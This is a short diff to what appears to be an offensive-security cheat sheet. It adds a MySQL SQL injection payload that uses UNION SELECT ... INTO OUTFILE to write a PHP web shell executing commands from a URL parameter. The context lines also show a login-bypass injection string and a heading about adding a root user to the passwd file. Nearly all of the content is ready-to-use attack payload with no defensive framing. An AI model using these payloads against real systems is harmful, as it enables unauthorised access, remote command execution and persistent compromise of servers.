@@ -804,6 +804,11 @@ RECONFIGURE;
     #+begin_example
 username=' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password=password&login=
     #+end_example
+
+    Write webshell to server using SQLi union select (works for MySQL)
+    #+begin_example
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+    #+end_example
     
 ** Linux
    Add root user to passwd file (root2:w00t)
